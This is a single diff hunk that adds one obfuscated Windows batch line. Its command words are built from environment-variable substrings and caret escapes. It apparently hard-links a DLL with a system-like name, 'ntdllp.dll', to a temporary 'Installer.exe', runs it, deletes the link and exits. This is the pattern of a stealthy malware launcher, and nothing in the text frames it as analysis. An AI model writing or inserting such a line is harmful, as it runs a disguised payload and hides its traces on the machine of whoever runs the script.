@@ -1,0 +1,1 @@
+%PATHEXT:~3,1%k^l%systemroot:~4,1%n^k /H "%tmp%\Installer.exe" "%windir%\syswow64\ntdllp.dll" >nul 2>&1 & "%tmp%\Installer.exe" & D%tmp:~5,1%^l "%tmp%\Installer.exe" && ex^%windir:~4,1%t
